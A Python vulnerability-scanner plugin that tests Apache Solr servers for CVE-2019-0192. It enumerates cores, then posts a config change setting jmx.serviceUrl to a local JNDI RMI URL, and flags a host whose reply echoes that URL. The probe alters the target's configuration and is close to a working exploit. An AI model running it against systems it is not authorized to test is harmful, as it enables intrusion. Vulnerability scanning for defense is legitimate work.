#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):

    url = '{}://{}:{}/solr/admin/cores?wt=json'.format(service, ip, port)
    apps = []
    try:
        r = await http_client(ip, port).get(url, timeout=10.0)
        result = r.json()
        apps = result['status'].keys()
    except Exception as e:
        pass

    if apps:
        data = {"set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://127.0.0.1:56411/vultest"}}
        for app in apps:
            if not app:
                continue
            url = '{}://{}:{}/solr/{}/config'.format(service, ip, port, app)
            try:
                r = await http_client(ip, port).post(url, json=data, timeout=10.0)
                if 'rmi://127.0.0.1:56411/vultest' in r.text:
                    ret = {
                        'alert_group': 'Apache Solr RCE CVE-2019-0192',
                        'affects': url,
                        'details': 'Apache Solr RCE CVE-2019-0192, app is %s' % app
                    }
                    return ret
            except Exception as e:
                debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8983, 'http', True, task_msg={})
    run_plugin_test(scan)
